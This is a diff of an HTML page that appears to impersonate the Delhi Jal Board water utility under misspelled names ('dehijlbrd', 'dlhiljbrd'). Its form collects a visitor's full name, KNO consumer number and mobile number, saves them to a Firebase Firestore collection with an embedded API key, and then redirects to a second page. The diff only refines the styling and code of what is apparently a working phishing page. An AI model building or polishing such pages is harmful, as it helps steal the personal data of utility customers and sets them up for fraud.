@@ -1,76 +1,83 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>dehijlbrd</title>
   <style>
+    * {
+      box-sizing: border-box;
+    }
     body {
-      font-family: Arial;
+      font-family: Arial, sans-serif;
       background-color: #FFFFFF;
+      margin: 0;
+      padding: 20px;
       text-align: center;
-      padding-top: 50px;
     }
     img {
-      width: 300px;
+      width: 100%;
+      max-width: 300px;
       border-radius: 10px;
     }
+    .form-container {
+      margin-top: 30px;
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      max-width: 100%;
+      width: 100%;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    .form-container h2 {
+      background-color: #00008b;
+      color: white;
+      padding: 12px;
+      font-size: 20px;
+      border-radius: 5px;
+    }
+    label {
+      font-size: 16px;
+      font-weight: bold;
+      display: block;
+      margin-top: 15px;
+      text-align: left;
+    }
+    input[type="text"], input[type="email"] {
+      width: 100%;
+      padding: 12px;
+      margin-top: 5px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
     .side-button {
-      margin-top: 2px;
-      padding: 10px 108px;
-      font-size: 17px;
+      margin-top: 20px;
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
       background-color: #FF0000;
       color: #FFFFFF;
       border: none;
       border-radius: 10px;
     }
-    .form-container {
-      margin-top: 50px;
-      text-align: left;
-      max-width: 400px;
-      margin-left: auto;
-      margin-right: auto;
-      background: white;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    input[type="text"], input[type="email"] {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-    }
-    label {
-      font-size: 16px;
-      font-weight: bold;
-    }
-    .form-container h2 {
-      text-align: center;
-      background-color: #00008b;
-      color: white;
-      padding: 10px;
-      border-radius: 5px;
-    }
   </style>
 </head>
 <body>
-  <img src="https://i.ibb.co/s9ptXmZv/images-5.jpg" alt="Meri Tasveer">
+  <img src="https://i.ibb.co/s9ptXmZv/images-5.jpg" alt="Meri Tasveer" />
 
   <div class="form-container">
-    <h2>जल¥बोर्ड </h2>
+    <h2>जल¥बोर्ड</h2>
     <form onsubmit="submitForm(event)">
       <label for="name">Name*</label>
-      <input type="text" id="name" placeholder="Full Name" required>
+      <input type="text" id="name" placeholder="Full Name" required />
 
       <label for="kno">Kno Number*</label>
-      <input type="text" id="kno" placeholder="KNO Number" required>
+      <input type="text" id="kno" placeholder="KNO Number" required />
 
       <label for="mobile">Mobile*</label>
-      <input type="text" id="mobile" placeholder="Mobile Number" required>
+      <input type="text" id="mobile" placeholder="Mobile Number" required />
 
-      <div style="text-align: center;">
-        <button class="side-button" type="submit">Continue</button>
-      </div>
+      <button class="side-button" type="submit">Continue</button>
     </form>
   </div>
 
@@ -79,7 +86,6 @@
   <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>
 
   <script>
-    // Your Firebase config
     const firebaseConfig = {
       apiKey: "AIzaSyDdRv4_wFI5hjSi_0ci_YDUsdWY5Uv7wDE",
       authDomain: "dlhiljbrd.firebaseapp.com",
@@ -94,18 +100,17 @@
 
     function submitForm(e) {
       e.preventDefault();
-
       const name = document.getElementById("name").value;
       const kno = document.getElementById("kno").value;
       const mobile = document.getElementById("mobile").value;
 
       db.collection("users").add({
-        name: name,
-        kno: kno,
-        mobile: mobile,
+        name,
+        kno,
+        mobile,
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
       }).then(() => {
-        window.location.href = "page2.html"; // Replace with your actual next page
+        window.location.href = "page2.html";
       }).catch((error) => {
         alert("Error saving data: " + error);
       });
